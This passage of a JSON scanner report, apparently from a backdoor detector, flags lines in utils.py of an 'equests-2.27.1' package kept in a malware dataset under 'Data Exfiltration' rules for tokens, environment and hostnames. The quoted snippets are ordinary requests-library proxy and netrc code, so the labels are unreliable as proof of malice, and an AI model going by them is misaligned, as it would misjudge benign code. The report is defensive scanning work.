            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 857,
                  "startColumn": 31,
                  "endLine": 857,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                    "rendered": {
                      "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                      "markdown": "`    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 851,
                  "startColumn": 22,
                  "endLine": 851,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    proxies = proxies if proxies is not None else {}\n    url = request.url\n    scheme = urlparse(url).scheme\n    no_proxy = proxies.get('no_proxy')\n    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n",
                    "rendered": {
                      "text": "    proxies = proxies if proxies is not None else {}\n    url = request.url\n    scheme = urlparse(url).scheme\n    no_proxy = proxies.get('no_proxy')\n    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n",
                      "markdown": "`    proxies = proxies if proxies is not None else {}\n    url = request.url\n    scheme = urlparse(url).scheme\n    no_proxy = proxies.get('no_proxy')\n    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 820,
                  "startColumn": 51,
                  "endLine": 820,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n",
                    "rendered": {
                      "text": "    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n",
                      "markdown": "`    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 820,
                  "startColumn": 22,
                  "endLine": 820,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n",
                    "rendered": {
                      "text": "    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n",
                      "markdown": "`    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 57,
                  "endLine": 746,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                    "rendered": {
                      "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                      "markdown": "`    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 36,
                  "endLine": 746,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                    "rendered": {
                      "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                      "markdown": "`    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 726,
                  "startColumn": 30,
                  "endLine": 726,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n",
                    "rendered": {
                      "text": "    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n",
                      "markdown": "`    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 522,
                  "startColumn": 26,
                  "endLine": 522,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    :rtype: str\n    \"\"\"\n\n    content_type = headers.get('content-type')\n\n    if not content_type:\n        return None\n",
                    "rendered": {
                      "text": "    :rtype: str\n    \"\"\"\n\n    content_type = headers.get('content-type')\n\n    if not content_type:\n        return None\n",
                      "markdown": "`    :rtype: str\n    \"\"\"\n\n    content_type = headers.get('content-type')\n\n    if not content_type:\n        return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 27,
                  "endLine": 182,
                  "endColumn": 32,
                  "snippet": {
                    "text": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n",
                    "rendered": {
                      "text": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n",
                      "markdown": "`def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 998,
                  "startColumn": 57,
                  "endLine": 998,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    parsed = urlparse(url)\n\n    try:\n        auth = (unquote(parsed.username), unquote(parsed.password))\n    except (AttributeError, TypeError):\n        auth = ('', '')\n\n",
                    "rendered": {
                      "text": "    parsed = urlparse(url)\n\n    try:\n        auth = (unquote(parsed.username), unquote(parsed.password))\n    except (AttributeError, TypeError):\n        auth = ('', '')\n\n",
                      "markdown": "`    parsed = urlparse(url)\n\n    try:\n        auth = (unquote(parsed.username), unquote(parsed.password))\n    except (AttributeError, TypeError):\n        auth = ('', '')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 991,
                  "startColumn": 13,
                  "endLine": 991,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\ndef get_auth_from_url(url):\n    \"\"\"Given a url with authentication components, extract them into a tuple of\n    username,password.\n\n    :rtype: (str,str)\n    \"\"\"\n",
                    "rendered": {
                      "text": "\ndef get_auth_from_url(url):\n    \"\"\"Given a url with authentication components, extract them into a tuple of\n    username,password.\n\n    :rtype: (str,str)\n    \"\"\"\n",
                      "markdown": "`\ndef get_auth_from_url(url):\n    \"\"\"Given a url with authentication components, extract them into a tuple of\n    username,password.\n\n    :rtype: (str,str)\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 38,
                  "endLine": 222,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        try:\n            _netrc = netrc(netrc_path).authenticators(host)\n            if _netrc:\n                # Return with login / password\n                login_i = (0 if _netrc[0] else 1)\n                return (_netrc[login_i], _netrc[2])\n        except (NetrcParseError, IOError):\n",
                    "rendered": {
                      "text": "        try:\n            _netrc = netrc(netrc_path).authenticators(host)\n            if _netrc:\n                # Return with login / password\n                login_i = (0 if _netrc[0] else 1)\n                return (_netrc[login_i], _netrc[2])\n        except (NetrcParseError, IOError):\n",
                      "markdown": "`        try:\n            _netrc = netrc(netrc_path).authenticators(host)\n            if _netrc:\n                # Return with login / password\n                login_i = (0 if _netrc[0] else 1)\n                return (_netrc[login_i], _netrc[2])\n        except (NetrcParseError, IOError):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 857,
                  "startColumn": 16,
                  "endLine": 857,
                  "endColumn": 63,
                  "snippet": {
                    "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                    "rendered": {
                      "text": "    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n",
                      "markdown": "`    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n        if proxy:\n            new_proxies.setdefault(scheme, proxy)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 855,
                  "startColumn": 8,
                  "endLine": 855,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n",
                    "rendered": {
                      "text": "    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n",
                      "markdown": "`    new_proxies = proxies.copy()\n\n    if trust_env and not should_bypass_proxies(url, no_proxy=no_proxy):\n        environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n\n        proxy = environ_proxies.get(scheme, environ_proxies.get('all'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 29,
                  "endLine": 746,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                    "rendered": {
                      "text": "    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n",
                      "markdown": "`    \"\"\"\n    # Prioritize lowercase environment variables over uppercase\n    # to keep a consistent behaviour with other http projects (curl, wget).\n    get_proxy = lambda k: os.environ.get(k) or os.environ.get(k.upper())\n\n    # First check whether no_proxy is defined. If it is, check that the URL\n    # we're getting isn't in the no_proxy list.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 726,
                  "startColumn": 23,
                  "endLine": 726,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n",
                    "rendered": {
                      "text": "    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n",
                      "markdown": "`    If 'value' is None, do nothing\"\"\"\n    value_changed = value is not None\n    if value_changed:\n        old_value = os.environ.get(env_name)\n        os.environ[env_name] = value\n    try:\n        yield\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 20,
                  "endLine": 182,
                  "endColumn": 31,
                  "snippet": {
                    "text": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n",
                    "rendered": {
                      "text": "def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n",
                      "markdown": "`def get_netrc_auth(url, raise_errors=False):\n    \"\"\"Returns the Requests tuple auth for a given url from netrc.\"\"\"\n\n    netrc_file = os.environ.get('NETRC')\n    if netrc_file is not None:\n        netrc_locations = (netrc_file,)\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 17,
                  "endLine": 34,
                  "endColumn": 33,
                  "snippet": {
                    "text": "from .compat import (\n    quote, urlparse, bytes, str, unquote, getproxies,\n    proxy_bypass, urlunparse, basestring, integer_types, is_py3,\n    proxy_bypass_environment, getproxies_environment, Mapping)\nfrom .cookies import cookiejar_from_dict\nfrom .structures import CaseInsensitiveDict\nfrom .exceptions import (\n",
                    "rendered": {
                      "text": "from .compat import (\n    quote, urlparse, bytes, str, unquote, getproxies,\n    proxy_bypass, urlunparse, basestring, integer_types, is_py3,\n    proxy_bypass_environment, getproxies_environment, Mapping)\nfrom .cookies import cookiejar_from_dict\nfrom .structures import CaseInsensitiveDict\nfrom .exceptions import (\n",
                      "markdown": "`from .compat import (\n    quote, urlparse, bytes, str, unquote, getproxies,\n    proxy_bypass, urlunparse, basestring, integer_types, is_py3,\n    proxy_bypass_environment, getproxies_environment, Mapping)\nfrom .cookies import cookiejar_from_dict\nfrom .structures import CaseInsensitiveDict\nfrom .exceptions import (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 825,
                  "startColumn": 28,
                  "endLine": 825,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n    ]\n    proxy = None\n",
                    "rendered": {
                      "text": "    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n    ]\n    proxy = None\n",
                      "markdown": "`    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n    ]\n    proxy = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 823,
                  "startColumn": 43,
                  "endLine": 823,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n",
                    "rendered": {
                      "text": "        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n",
                      "markdown": "`        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n        urlparts.scheme + '://' + urlparts.hostname,\n        urlparts.scheme,\n        'all://' + urlparts.hostname,\n        'all',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 819,
                  "startColumn": 16,
                  "endLine": 819,
                  "endColumn": 24,
                  "snippet": {
                    "text": "    \"\"\"\n    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n",
                    "rendered": {
                      "text": "    \"\"\"\n    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n",
                      "markdown": "`    \"\"\"\n    proxies = proxies or {}\n    urlparts = urlparse(url)\n    if urlparts.hostname is None:\n        return proxies.get(urlparts.scheme, proxies.get('all'))\n\n    proxy_keys = [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/utils.py"
                },
                "region": {
                  "startLine": 789,
                  "startColumn": 41,
                  "endLine": 789,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n            bypass = False\n\n",
                    "rendered": {
                      "text": "    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n            bypass = False\n\n",
                      "markdown": "`    with set_environ('no_proxy', no_proxy_arg):\n        # parsed.hostname can be `None` in cases such as a file URI.\n        try:\n            bypass = proxy_bypass(parsed.hostname)\n        except (TypeError, socket.gaierror):\n            bypass = False\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
